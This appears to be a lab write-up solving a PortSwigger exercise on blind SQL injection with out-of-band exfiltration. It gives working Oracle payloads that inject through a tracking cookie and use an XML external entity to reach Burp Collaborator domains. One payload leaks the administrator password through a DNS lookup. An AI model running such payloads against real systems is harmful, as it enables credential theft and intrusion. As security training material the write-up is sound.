## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a8983182-49f9-42fc-a2cf-40038c80285f)


## Solution :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4599b5b1-1a2f-4712-ac85-f582960b110c)

The payloads for each domain to perform a DNS lookup to an external domain to retrieve details of any DNS interactions, including the exfiltrated data.

Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```

Request captured -

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/32671bd0-1238-4bd3-9046-27f012d3b50b)

`Send this to Repeater`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9e3092cc-2ca4-4aa4-99a4-a3dc8a2cfdb3)

Since we are unsure of the database we are working with first we need to find which database is this.

So the first one will be  `Oracle`

For that the payload is 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

Then query will be changed by pasting the external  domain provided by collaborator would look like this

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://hsdsl3chnluavy0asy6vodz1ys4js9gy.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/413252f4-01c4-400b-86ea-2e9cdda2366c)

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4e0d9c3c-8559-4cdd-90ec-7abf91a14a65)

By this we conformed that the databse is `Oracle`.

#### Now we need retrieve the passward from table called users, with columns called username and password.

For that the payload is

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

Then query will be changed by pasting the external  domain provided by collaborator and the query we will be inserting to find the username and password.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'  ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username = 'administrator')||'.ioazd8xqptdibxgwg4h9xbeq5hb9zzno.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
and press ctrl+U to encode it and send.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/18406095-c0d4-4289-94a0-427a8c1208ec)

Then go to collaborator and press poll.

![Screenshot 2024-03-11 010638](https://github.com/ananthan05/Portswigger_labs/assets/140697378/61388154-91f9-415d-ac07-fdb4a90eb550)

we can see the password as `qd9c2hadzroxq99ncym3`

now go to login page.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/202afac3-8886-49e4-b9ba-82771428c49f)

